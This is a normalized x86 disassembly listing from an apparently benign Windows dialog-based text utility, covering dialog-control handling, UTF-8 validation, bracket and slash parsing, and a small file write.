cmp ax [ edi ]
pop edi
pop esi
pop ebp
pop ebx
sbb eax eax
neg eax
add esp 0x8
retn
jmp r-xdata
add esi 0x2
add eax 0x2
cmp esi ecx
jne r-xdata
mov cx [ ebp ]
test cx cx
je r-xdata
cmp eax edx
je r-xdata
jmp r-xdata
cmp ax cx
jne r-xdata
mov ax [ edi + 0x2 ]
add edi 0x2
add ebp 0x2
test ax ax
jne r-xdata
sub_405ec0
push ebx
mov ebx [ esp + 0x10 ]
test ebx ebx
jne r-xdata
push ebp
mov ebp [ esp + 0x10 ]
movzx eax [ ebp ]
add eax 0xffffffd6
cmp eax 0x33
push esi
push edi
ja r-xdata
xor eax eax
pop ebx
retn
mov edi [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push edx
mov [ esp + 0x20 ] edi
call sub_418b70
movzx ecx [ ebp ]
add esp 0x4
cmp eax ecx
jne r-xdata
movzx eax [ eax + lookup_table_406008 ]
jmp [ eax * 4 + jump_table_405ff4 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov esi [ esp + 0x1c ]
sub esi edi
mov edi [ esp + 0x14 ]
mov al [ edi ]
cmp al 0x5d
je r-xdata
mov edi [ esp + 0x14 ]
mov al [ edi ]
xor esi esi
cmp al 0x5d
je r-xdata
mov edi [ esp + 0x14 ]
mov al [ edi ]
cmp al 0x5d
je r-xdata
pop edi
add eax esi
pop esi
pop ebp
pop ebx
retn
xor esi esi
jmp r-xdata
cmp al 0x20
je r-xdata
dec ebx
add ebp 0x2
lea esp [ esp ]
lea esp [ esp ]
cmp al 0x20
je r-xdata
dec ebx
push ebx
add ebp 0x2
lea edx [ esi + edi ]
push ebp
push edx
call sub_405ec0
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp al 0x2f
je r-xdata
lea eax [ esi - 0x1 ]
mov ecx edi
call sub_4046a0
mov esi eax
test esi esi
jge r-xdata
test esi esi
jl r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x2f
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xffffffff
pop ebx
retn
push ebx
lea ecx [ esi + edi ]
push ebp
push ecx
call sub_405ec0
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov al [ esi + edi + 0x1 ]
inc esi
cmp al 0x5d
jne r-xdata
movzx eax al
call sub_404740
mov esi eax
jmp r-xdata
cmp al 0x20
je r-xdata
sub_406040
push ebp
mov ebp [ esp + 0x10 ]
test ebp ebp
jne r-xdata
push ebx
mov ebx [ esp + 0x10 ]
movzx eax [ ebx + ebp * 2 - 0x2 ]
dec ebp
add eax 0xffffffd6
cmp eax 0x33
push esi
push edi
ja r-xdata
xor eax eax
pop ebp
retn
mov edi [ esp + 0x14 ]
xor eax eax
mov ecx edi
call sub_4046a0
mov esi 0x1
sub esi eax
mov edx edi
sub edx esi
lea eax [ esp + 0x1c ]
inc edx
push eax
mov [ esp + 0x20 ] edx
call sub_418b70
movzx ecx [ ebx + ebp * 2 ]
add esp 0x4
cmp eax ecx
jne r-xdata
movzx eax [ eax + lookup_table_4061ac ]
jmp [ eax * 4 + jump_table_406198 ]
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn
push ebp
push ebx
sub edi esi
push edi
call sub_406040
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov edi [ esp + 0x14 ]
mov al [ edi ]
cmp al 0x5b
je r-xdata
mov ebx [ esp + 0x14 ]
mov al [ ebx ]
xor edi edi
cmp al 0x5b
je r-xdata
mov edi [ esp + 0x14 ]
mov al [ edi ]
cmp al 0x5b
je r-xdata
pop edi
add eax esi
pop esi
pop ebx
pop ebp
retn
xor esi esi
jmp r-xdata
cmp al 0x20
je r-xdata
mov ecx [ esp + 0x18 ]
push ebp
mov esi ebx
push ecx
sub esi edi
push esi
call sub_406040
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
mov ecx ebx
jmp r-xdata
cmp al 0x20
je r-xdata
cmp al 0x2f
je r-xdata
add eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
movzx eax [ esi ]
call sub_404740
sub edi eax
jns r-xdata
cmp al 0x20
je r-xdata
cmp al 0x2f
je r-xdata
cmp al 0xa
je r-xdata
pop edi
pop esi
pop ebx
or eax 0xffffffff
pop ebp
retn
test edi edi
jl r-xdata
cmp al 0x2f
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
lea ecx [ ecx ]
cmp al 0xa
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xd
je r-xdata
xor eax eax
mov ecx edi
call sub_4046a0
mov esi 0x1
sub esi eax
jmp r-xdata
mov al [ ecx - 0x1 ]
inc edi
dec ecx
cmp al 0x5b
jne r-xdata
sub_4061e0
push esi
mov esi ecx
push edi
mov [ esi ] r--data
call sub_4049b0
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
push eax
call sub_429931
add esp 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
pop edi
pop esi
retn
push eax
call sub_429931
add esp 0x4
sub_406220
sub esp 0x610
push ebx
push esi
push edi
push 0x200
lea eax [ esp + 0x14 ]
push eax
mov ebx ecx
xor esi esi
call sub_404ce0
test eax eax
mov edi [ esp + 0x620 ]
jne r-xdata
lea ecx [ esp + 0x21c ]
push ecx
push esi
push 0x408
push 0x428
push edi
call [ SendDlgItemMessageA@IAT ]
mov eax [ esp + 0x624 ]
test eax eax
je r-xdata
mov al [ esp + 0x10 ]
test al al
lea ecx [ esp + 0x10 ]
mov [ esp + 0xc ] ecx
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x610
retn 0x8
push 0x100
lea edx [ esp + 0x14 ]
push edx
push 0x42b
push edi
call [ GetDlgItemTextA@IAT ]
lea eax [ esp + 0x10 ]
push eax
call [ lstrlenA@IAT ]
test eax eax
je r-xdata
push 0x42d
push edi
call [ IsDlgButtonChecked@IAT ]
test eax eax
mov eax [ esp + 0xc ]
je r-xdata
jmp r-xdata
test esi esi
jne r-xdata
push 0x134
push 0xef
push 0xee
push edi
call sub_420e20
add esp 0x10
cmp eax 0x6
jne r-xdata
inc eax
mov [ esp + 0xc ] eax
mov cl [ eax ]
test cl cl
je r-xdata
inc eax
mov [ esp + 0xc ] eax
mov cl [ eax ]
test cl cl
je r-xdata
cmp al 0x2f
je r-xdata
xor eax eax
test esi esi
jle r-xdata
mov ecx [ ebx + 0x1c ]
push ecx
jmp r-xdata
mov eax [ ebx + 0x1c ]
push eax
push 0x30
push 0xec
push 0xed
push edi
call sub_420e20
add esp 0x14
xor esi esi
cmp cl 0x2f
je r-xdata
mov edi edi
inc ecx
mov [ esp + 0xc ] ecx
mov al [ ecx ]
test al al
jne r-xdata
mov [ esp + eax + 0x10 ] 0x0
lea eax [ esp + 0x10 ]
push eax
lea esp [ esp ]
push 0x42b
push edi
call [ SetDlgItemTextA@IAT ]
cmp [ eax ] 0x0
jne r-xdata
movzx dx cl
mov [ esp + esi * 2 + 0x21c ] dx
inc esi
inc eax
mov [ esp + 0xc ] eax
mov cl [ eax ]
test cl cl
jne r-xdata
lea ecx [ esp + 0xc ]
push ecx
call sub_418b70
mov [ esp + esi * 2 + 0x220 ] ax
mov eax [ esp + 0x10 ]
mov cl [ eax ]
add esp 0x4
inc esi
test cl cl
jne r-xdata
mov dl [ esp + eax * 2 + 0x21c ]
mov [ esp + eax + 0x10 ] dl
inc eax
cmp eax esi
jl r-xdata
jmp r-xdata
cmp cl 0x2f
je r-xdata
jmp r-xdata
sub_4063c0
sub esp 0x80c
push ebp
mov ebp [ CheckDlgButton@IAT ]
push esi
push edi
mov edi [ esp + 0x81c ]
push 0x0
push 0x430
push edi
mov esi ecx
call ebp
push 0x0
push 0x42f
push edi
call ebp
push 0x0
push 0x426
push edi
call ebp
push 0x0
push 0x42c
push edi
call ebp
push 0x0
push 0x42d
push edi
call ebp
push 0x0
push 0x42e
push edi
call ebp
push 0x1
mov ecx esi
call sub_404ac0
lea ecx [ esp + 0x10 ]
call sub_404500
push eax
call sub_420ac0
add esp 0x4
neg eax
sbb eax eax
and eax 0xfffffff7
add eax 0x42f
push eax
push edi
call ebp
push 0x80a
lea eax [ esp + 0x10 ]
push eax
mov ecx esi
call sub_404ce0
test eax eax
je r-xdata
xor eax eax
mov cl 0x7f
push 0x1
push 0x42c
push edi
call ebp
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x80c
retn 0x4
cmp eax 0x800
jne r-xdata
cmp [ esp + eax + 0xd ] cl
ja r-xdata
xor eax eax
mov dl 0x80
push ebx
push 0x1
push 0x42c
push edi
call ebp
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x80c
retn 0x4
inc eax
jmp r-xdata
cmp [ esp + eax + 0xe ] cl
ja r-xdata
inc eax
cmp eax 0x800
jl r-xdata
mov bl cl
and bl 0xe0
cmp bl 0xc0
jne r-xdata
add eax 0x2
jmp r-xdata
cmp [ esp + eax + 0xf ] cl
ja r-xdata
mov cl [ esp + eax + 0x10 ]
test dl cl
je r-xdata
push 0x1
push 0x42d
push edi
call ebp
pop ebx
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x80c
retn 0x4
mov bl cl
and bl 0xf0
cmp bl 0xe0
jne r-xdata
mov bl [ esp + eax + 0x11 ]
and bl 0xc0
cmp bl dl
jne r-xdata
add eax 0x3
jmp r-xdata
cmp [ esp + eax + 0x10 ] cl
ja r-xdata
and cl 0xf8
cmp cl 0xf0
jne r-xdata
mov bl [ esp + eax + 0x11 ]
and bl 0xc0
cmp bl dl
jne r-xdata
inc eax
jmp r-xdata
add eax 0x4
jmp r-xdata
cmp [ esp + eax + 0x11 ] cl
ja r-xdata
cmp eax 0x800
jl r-xdata
mov cl [ esp + eax + 0x11 ]
and cl 0xc0
cmp cl dl
jne r-xdata
mov bl [ esp + eax + 0x12 ]
and bl 0xc0
cmp bl dl
jne r-xdata
add eax 0x5
jmp r-xdata
cmp [ esp + eax + 0x12 ] cl
ja r-xdata
xor eax eax
push 0x1
push 0x42d
push edi
call ebp
pop ebx
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x80c
retn 0x4
mov cl [ esp + eax + 0x12 ]
and cl 0xc0
cmp cl dl
jne r-xdata
add eax 0x2
jmp r-xdata
add eax 0x6
jmp r-xdata
cmp [ esp + eax + 0x13 ] cl
ja r-xdata
inc eax
cmp eax 0x800
jl r-xdata
cmp cl dl
jb r-xdata
mov cl [ esp + eax + 0x13 ]
and cl 0xc0
cmp cl dl
jne r-xdata
add eax 0x7
add eax 0x8
cmp eax 0x800
jl r-xdata
mov cl [ esp + eax + 0x10 ]
cmp cl 0x7f
jbe r-xdata
push 0x1
push 0x42c
push edi
call ebp
pop ebx
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x80c
retn 0x4
cmp eax 0x800
jl r-xdata
cmp [ esp + eax + 0x11 ] dl
jb r-xdata
add eax 0x3
cmp [ esp + eax + 0xc ] cl
ja r-xdata
jmp r-xdata
push 0x1
push 0x42e
push edi
call ebp
pop ebx
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x80c
retn 0x4
push 0x1
push 0x42c
push edi
call ebp
pop ebx
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x80c
retn 0x4
inc eax
sub_406620
sub esp 0x8
push esi
push edi
push 0x1
push 0x3
mov esi ecx
push r--data
mov ecx rw-data
call sub_425b30
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push ebx
mov ebx [ WriteFile@IAT ]
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push 0x4
lea edx [ esp + 0x18 ]
push edx
push edi
mov [ esp + 0x20 ] 0x12bc3e76
call ebx
mov esi [ rw-data ]
test esi esi
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x4
lea ecx [ esp + 0x18 ]
push ecx
push edi
mov [ esp + 0x20 ] 0x0
call ebx
push edi
call [ CloseHandle@IAT ]
pop ebx
pop edi
xor eax eax
pop esi
add esp 0x8
retn
push edi
mov ecx esi
call sub_404d60
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
push eax
push 0xf0
push esi
call sub_4057e0
add esp 0xc
pop edi
mov eax 0x1
pop esi
add esp 0x8
retn
sub_406710
sub esp 0x54
push ebx
mov ebx [ GetDlgItem@IAT ]
push ebp
push edi
push 0x686
push esi
call ebx
push 0x0
push 0x0
mov edi eax
push 0x1004
push edi
call [ SendMessageA@IAT ]
mov [ esp + 0xc ] eax
call sub_4055e0
lea ecx [ esp + 0x10 ]
push ecx
mov ebp eax
push ebp
push 0x102d
lea eax [ esp + 0x44 ]
push edi
mov [ esp + 0x28 ] 0x4
mov [ esp + 0x38 ] 0x28
mov [ esp + 0x34 ] eax
call [ SendMessageA@IAT ]
push ebp
push 0x7d4
push esi
call ebx
mov edi [ EnableWindow@IAT ]
push eax
call edi
mov edx [ esp + 0xc ]
xor eax eax
dec edx
cmp ebp edx
setl al
push eax
push 0x7d5
push esi
call ebx
push eax
call edi
push 0x10d
call sub_420ca0
add esp 0x4
push eax
lea ecx [ esp + 0x3c ]
push ecx
call [ lstrcmpA@IAT ]
push eax
push 0x7d3
push esi
call ebx
push eax
call edi
pop edi
pop ebp
pop ebx
add esp 0x54
retn
sub_4067d0
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0x248 ]
xor ecx ecx
push edi
xor ebx ebx
xor ebp ebp
xor edi edi
cmp eax ecx
mov [ esi + 0x254 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edx [ esi + 0x23c ]
jmp r-xdata
mov ax [ edx ]
and ax 0x7f00
jne r-xdata
cmp ax 0x2400
je r-xdata
mov eax [ esi + 0x254 ]
inc edi
inc eax
jmp r-xdata
inc ebp
cmp ax 0x2500
je r-xdata
mov [ esi + 0x254 ] eax
mov eax [ esi + 0x248 ]
inc ecx
add edx 0x2
cmp ecx eax
jl r-xdata
test edi edi
je r-xdata
inc ebx
jmp r-xdata
test ebx ebx
jne r-xdata
test ebp ebp
jne r-xdata
mov eax [ esi + 0x254 ]
add eax 0x2
mov al [ rw-data ]
test al al
mov bl 0x1
je r-xdata
cmp ebp 0x2
jge r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2
pop ebx
retn
test ebx ebx
je r-xdata
xor al al
mov eax [ esi + 0x23c ]
cmp [ eax ] 0x213c
jne r-xdata
cmp edi 0x3
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea ebx [ ebx ]
mov al bl
jmp r-xdata
mov ecx [ esi + 0x218 ]
mov edx [ ecx + 0x4 ]
mov eax edx
test eax eax
mov [ esi + 0x218 ] edx
jne r-xdata
cmp [ eax + 0x22 ] 0x2
jne r-xdata
mov [ esi + 0x238 ] al
mov eax [ rw-data ]
mov [ esi + 0x218 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esi + 0x218 ]
mov cl [ eax + 0x24 ]
test cl cl
je r-xdata
mov cl [ rw-data ]
test cl cl
jne r-xdata
mov cl [ esi + 0x236 ]
test cl cl
jne r-xdata
movzx cx [ eax + 0x23 ]
mov [ esi + 0x20e ] cx
mov ecx [ esi + 0x218 ]
call sub_404c10
mov ecx [ esi + 0x218 ]
mov edi eax
test edi edi
je r-xdata
cmp [ eax + 0x23 ] bl
je r-xdata
mov eax [ esi + 0x248 ]
mov edx [ ecx ]
push eax
mov eax [ esi + 0x23c ]
push eax
call [ edx ]
mov ecx [ esi + 0x218 ]
mov al [ ecx + 0x26 ]
test al al
jne r-xdata
mov al [ ecx + 0x27 ]
test al al
jne r-xdata
cmp [ esi + 0x234 ] 0x2
je r-xdata
call sub_4049b0
call sub_404ac0
push eax
push edi
push esi
call sub_4057e0
add esp 0xc
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0xa
pop ebx
retn
sub_406980
push ecx
push esi
mov esi ecx
mov al [ esi + 0x235 ]
test al al
mov [ esp + 0x4 ] esi
jne r-xdata
push ebp
push edi
mov edi [ esp + 0x14 ]
mov al [ edi ]
xor ebp ebp
cmp al 0xa
je r-xdata
xor eax eax
pop esi
pop ecx
retn 0x4
pop edi
pop ebp
xor eax eax
pop esi
pop ecx
retn 0x4
push ebx
lea esp [ esp ]
test ebp ebp
pop ebx
je r-xdata
cmp al 0x28
je r-xdata
mov ecx [ esp + 0x14 ]
mov al [ ecx ]
xor edx edx
cmp al 0xa
je r-xdata
mov ebx 0x2
mov esi rw-data
mov edi edi
inc edi
jmp r-xdata
mov edi [ esi + 0x22c ]
push 0x0
inc edi
push esi
mov [ esi + 0x22c ] edi
call sub_4059a0
add esp 0x8
pop edi
pop ebp
mov eax 0x1
pop esi
pop ecx
retn 0x4
lea esp [ esp ]
mov cl [ ebx * 8 + rw-data ]
test cl cl
jne r-xdata
add esi 0x8
inc ebx
cmp esi rw-data
jl r-xdata
cmp [ edi ] 0xa
mov esi [ esp + 0x10 ]
jne r-xdata
cmp edx 0x1
jg r-xdata
cmp al 0x2f
jne r-xdata
mov cl [ edi ]
cmp cl 0x28
jne r-xdata
add edi eax
jmp r-xdata
mov edx esi
mov eax edi
call sub_404650
test eax eax
jne r-xdata
mov ebx 0x2
mov esi rw-data
mov al [ edi ]
cmp al 0xd
je r-xdata
mov al [ ecx + 0x1 ]
inc ecx
cmp al 0xa
jne r-xdata
inc edx
cmp cl 0x28
mov edx edi
jne r-xdata
cmp [ eax + edi ] 0x29
je r-xdata
cmp [ edi ] 0x29
jne r-xdata
add esi 0x2
cmp esi rw-data
jl r-xdata
cmp al 0xd
je r-xdata
mov cl [ edx + eax ]
cmp cl 0xa
je r-xdata
lea edx [ edi + 0x1 ]
lea ecx [ eax + edi ]
cmp [ ecx ] 0x2f
je r-xdata
jmp r-xdata
mov edx esi
mov eax edi
call sub_404650
test eax eax
jne r-xdata
inc edi
jmp r-xdata
mov [ edx ] 0xa
nop
cmp [ edi ] 0x2f
je r-xdata
mov al [ ecx + 0x1 ]
inc ecx
cmp al 0x2f
jne r-xdata
mov [ edx ] cl
mov cl [ edx + eax + 0x1 ]
inc edx
cmp cl 0xa
jne r-xdata
mov al [ ecx ]
cmp al 0xa
mov edx edi
je r-xdata
mov al [ edi - 0x1 ]
dec edi
cmp al 0x2f
jne r-xdata
cmp cl 0xd
je r-xdata
mov [ edx ] 0xa
mov ebp 0x1
cmp al 0xd
je r-xdata
mov [ edx ] al
mov al [ ecx + 0x1 ]
inc edx
inc ecx
cmp al 0xa
jne r-xdata
sub_406b10
push esi
mov esi ecx
mov eax [ esi + 0x250 ]
test eax eax
je r-xdata
inc [ esi + 0x248 ]
inc eax
mov [ esi + 0x250 ] eax
jmp r-xdata
dec [ esi + 0x248 ]
pop esi
retn 0x4
dec ecx
mov [ esi + 0x250 ] ecx
pop esi
retn 0x4
mov eax [ esp + 0x8 ]
push eax
mov ecx esi
call sub_405a10
mov ecx esi
call sub_4067d0
mov ecx [ esi + 0x250 ]
test ecx ecx
je r-xdata
sub_406b60
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_405a10
test eax eax
je r-xdata
mov ecx esi
call sub_4067d0
pop esi
retn 0x4
xor eax eax
pop esi
retn 0x4
sub_406b90
sub esp 0xd4
push esi
mov esi ecx
mov [ esp + 0x8 ] 0x1
call sub_405980
test eax eax
je r-xdata
push ebx
push ebp
push edi
mov ecx esi
call sub_405850
mov eax [ esi + 0x220 ]
mov ebx [ SendDlgItemMessageA@IAT ]
lea ebp [ esi + 0x23c ]
push ebp
push 0x0
push 0x409
push 0x438
push eax
call ebx
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x239 ] 0x0
pop esi
add esp 0xd4
retn
pop edi
pop ebp
pop ebx
pop esi
add esp 0xd4
retn
cmp edi 0x64
jle r-xdata
mov ecx [ ebp ]
mov ax [ ecx ]
cmp ax 0x20
je r-xdata
mov edi 0x64
lea esp [ esp ]
add ecx 0x2
mov [ ebp ] ecx
dec edi
jmp r-xdata
cmp ax 0x9
je r-xdata
cmp ax 0x2121
jne r-xdata
test edi edi
je r-xdata
mov ecx [ esi + 0x220 ]
push 0x0
push 0x0
push 0x40a
push 0x439
push ecx
call ebx
cmp edi 0x4
mov [ esi + 0x230 ] 0x0
mov [ esi + 0x23a ] 0x0
mov [ esi + 0x23b ] 0x0
mov ecx 0x2129
jne r-xdata
mov eax [ ebp ]
lea ecx [ eax + edi * 2 - 0x2 ]
lea esp [ esp ]
xor ebx ebx
test edi edi
jle r-xdata
mov eax [ ebp ]
cmp [ eax ] cx
jne r-xdata
dec edi
sub ecx 0x2
test edi edi
jne r-xdata
cmp ax 0x9
je r-xdata
mov cl [ esi + 0x23b ]
test cl cl
lea eax [ esp + edi * 2 + 0x18 ]
mov [ eax ] 0x0
je r-xdata
mov edx [ ebp ]
mov ax [ edx + ebx * 2 ]
movzx edx ax
mov ecx edx
cmp ecx 0x2129
mov [ esp + ebx * 2 + 0x18 ] ax
jg r-xdata
cmp [ eax + 0x2 ] cx
jne r-xdata
mov ax [ ecx ]
cmp ax 0x20
je r-xdata
cmp ax 0x2121
jne r-xdata
mov al [ esi + 0x23a ]
test al al
je r-xdata
mov dl [ esi + 0x23a ]
test dl dl
je r-xdata
sub ecx 0x214e
je r-xdata
je r-xdata
cmp [ eax + 0x4 ] cx
jne r-xdata
lea edx [ esp + 0x18 ]
xor ecx ecx
test edi edi
jle r-xdata
test cl cl
je r-xdata
mov [ esi + 0x23a ] 0x0
mov [ esp + ebx * 2 + 0x18 ] 0x5b
dec ecx
je r-xdata
mov [ esp + ebx * 2 + 0x18 ] 0x3f
jmp r-xdata
sub ecx 0x2a
cmp ecx 0x33
ja r-xdata
cmp [ eax + 0x6 ] cx
jne r-xdata
mov [ esi + 0x235 ] 0x1
add eax 0x8
cmp eax rw-data
jl r-xdata
cmp ecx edi
jne r-xdata
mov eax 0x3000
mov edi edi
cmp [ esp + 0x18 ] 0x74
jne r-xdata
mov [ esp + ebx * 2 + 0x18 ] 0x5d
jmp r-xdata
sub ecx 0x27
je r-xdata
mov [ esi + 0x23a ] 0x1
mov ecx eax
and ecx 0x7f00
test cx cx
jne r-xdata
movzx ecx [ ecx + lookup_table_4072d4 ]
jmp [ ecx * 4 + jump_table_4072c0 ]
mov [ esp + 0x1e ] cx
mov [ esp + 0x1c ] cx
mov [ esp + 0x1a ] cx
mov [ esp + 0x18 ] cx
jmp r-xdata
xor al al
mov al [ rw-data ]
test al al
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
lea eax [ esp + 0x18 ]
mov [ esi + 0x240 ] eax
lea eax [ ecx + 0x1 ]
cmp eax edi
lea ebx [ esp + ecx * 2 + 0x18 ]
mov [ esi + 0x24c ] ecx
mov [ ebp ] ebx
jge r-xdata
push 0xff
jmp r-xdata
inc ecx
cmp ecx edi
jl r-xdata
cmp [ esp + 0x1a ] 0x6f
jne r-xdata
mov [ esp + ebx * 2 + 0x18 ] 0x2a
jmp r-xdata
cmp cx 0x2300
jne r-xdata
push edx
call sub_429b24
add esp 0x4
mov [ esp + ebx * 2 + 0x18 ] ax
mov [ esi + 0x23b ] 0x1
jmp r-xdata
mov eax edi
dec eax
mov [ esi + 0x239 ] 0x0
je r-xdata
cmp edi ebx
je r-xdata
mov al 0x1
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx eax
sub edx ecx
lea ecx [ ebx + edx * 2 ]
sub edi eax
mov [ esi + 0x248 ] edx
mov [ esi + 0x244 ] ecx
mov [ esi + 0x250 ] edi
jmp r-xdata
jmp r-xdata
push esi
call sub_4057e0
add esp 0x8
mov [ esi + 0x234 ] 0x0
cmp [ esp + ecx * 2 + 0x18 ] ax
jae r-xdata
cmp [ esp + 0x1c ] 0x20
jne r-xdata
cmp cx 0x2500
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
push 0xfa
dec eax
je r-xdata
mov edi 0xa
mov ecx esi
mov [ esi + 0x236 ] al
call sub_4067d0
mov edi eax
mov al [ esi + 0x239 ]
test al al
je r-xdata
xor ebx ebx
push 0xf9
mov [ esi + 0x22c ] ebx
mov [ esi + 0x228 ] ebx
mov [ esi + 0x234 ] 0x1
call sub_420ca0
push eax
push esi
call sub_4059a0
add esp 0xc
mov [ esi + 0x235 ] bl
mov eax rw-data
mov dx [ esp + eax * 2 + 0x18 ]
cmp dx 0x2a
je r-xdata
lea ecx [ esp + 0x18 ]
mov [ esi + 0x23a ] 0x1
mov [ esi + 0x240 ] ecx
mov [ esi + 0x24c ] 0x3
lea edx [ esp + 0x1e ]
add edi 0xfffffffd
mov [ esi + 0x244 ] eax
mov [ esi + 0x250 ] 0x0
jmp r-xdata
and eax 0xff
or eax 0x2400
mov [ esp + ebx * 2 + 0x18 ] ax
jmp r-xdata
push edx
call sub_417650
movzx edx ax
push edx
mov [ esp + ebx * 2 + 0x20 ] ax
call sub_429b24
add esp 0x8
mov [ esp + ebx * 2 + 0x18 ] ax
mov [ esi + 0x23b ] 0x1
jmp r-xdata
push 0xfb
jmp r-xdata
cmp edi ebx
jne r-xdata
cmp dx 0x3f
je r-xdata
mov [ esi + 0x248 ] edi
mov [ ebp ] edx
cmp edi 0xa
jne r-xdata
mov al [ esi + 0x23b ]
test al al
jne r-xdata
cmp dx 0x5b
je r-xdata
mov eax [ esi + 0x228 ]
test eax eax
je r-xdata
mov eax [ esi + 0x22c ]
mov ecx [ esi + 0x228 ]
push eax
neg eax
sbb eax eax
push ecx
add eax 0xfd
push eax
call sub_420ca0
add esp 0x4
push eax
push esi
call sub_4059a0
add esp 0x10
mov al [ rw-data ]
test al al
je r-xdata
cmp dx 0x5d
je r-xdata
mov eax [ esi + 0x22c ]
test eax eax
jne r-xdata
mov edx [ esi + 0x220 ]
push 0x0
push 0x1
push 0x40b
push 0x439
push edx
call [ SendDlgItemMessageA@IAT ]
mov eax [ esi + 0x220 ]
push 0x439
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop ebp
pop ebx
mov [ esi + 0x234 ] 0x0
pop esi
add esp 0xd4
retn
mov al [ rw-data ]
test al al
je r-xdata
inc eax
cmp eax edi
jl r-xdata
push 0x40
call [ MessageBeep@IAT ]
pop edi
pop ebp
pop ebx
mov [ esi + 0x234 ] 0x0
pop esi
add esp 0xd4
retn
push 0xfe
call sub_420ca0
push eax
push esi
call sub_4059a0
add esp 0xc
mov eax [ esi + 0x228 ]
test eax eax
je r-xdata
push 0x100
mov ecx esi
call sub_40baf0
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov [ esi + 0x230 ] ecx
lea esp [ esp ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx esi
call sub_4067d0
mov edi eax
test edi edi
jne r-xdata
mov [ esp + 0x14 ] 0x0
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx esi
call sub_405950
mov ecx eax
and eax 0x7f00
cmp ax 0x2400
mov [ esp + 0x10 ] ecx
je r-xdata
cmp cx 0x2424
jne r-xdata
cmp ax 0x2500
je r-xdata
cmp cx 0x2443
jne r-xdata
push 0x242f
mov ecx esi
call sub_406b60
mov edi eax
test edi edi
jne r-xdata
push 0x246b
mov ecx esi
call sub_406b10
mov edi eax
test edi edi
jne r-xdata
cmp cx 0x2473
jne r-xdata
push 0x2426
mov ecx esi
call sub_406b60
mov edi eax
test edi edi
jne r-xdata
push 0x2430
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp cx 0x246f
jne r-xdata
push 0x244c
mov ecx esi
call sub_406b60
mov edi eax
test edi edi
jne r-xdata
push 0x2444
mov ecx esi
call sub_406b60
mov edi eax
test edi edi
jne r-xdata
mov ecx esi
call sub_406b60
mov edi eax
test edi edi
je r-xdata
cmp [ esp + 0x10 ] 0x2a
je r-xdata
push 0x2424
mov ecx esi
call sub_406b10
jmp r-xdata
movzx edx cx
push edx
call sub_4176b0
add esp 0x4
mov ebx eax
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov ecx 0x2422
mov [ esp + 0x10 ] ecx
push 0x2456
mov ecx esi
call sub_406b60
mov edi eax
test edi edi
jne r-xdata
push 0x246b
jmp r-xdata
mov eax [ esi + 0x250 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x3f
je r-xdata
mov edi eax
test edi edi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea ebp [ eax - 0x1 ]
mov al [ ebx + ebp ]
cmp al 0x69
je r-xdata
push 0x2460
dec [ esi + 0x248 ]
jmp r-xdata
dec eax
mov [ esi + 0x250 ] eax
jmp r-xdata
cmp [ esp + 0x10 ] 0x5b
je r-xdata
push 0x246b
mov ecx esi
call sub_406b10
mov edi eax
test edi edi
jne r-xdata
cmp al 0x65
jne r-xdata
cmp [ esp + 0x10 ] 0x5d
je r-xdata
cmp [ ebx + ebp ] 0x75
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
test ebp ebp
jne r-xdata
push 0x2424
mov ecx esi
call sub_406b60
movsx eax [ ebx ]
push eax
call sub_4020b0
add esp 0x4
test eax eax
je r-xdata
mov eax 0x2426
jmp r-xdata
push eax
mov ecx esi
call sub_406b60
mov edi eax
test edi edi
jne r-xdata
sub_407310
push esi
mov esi ecx
mov al [ esi + 0x23a ]
test al al
push edi
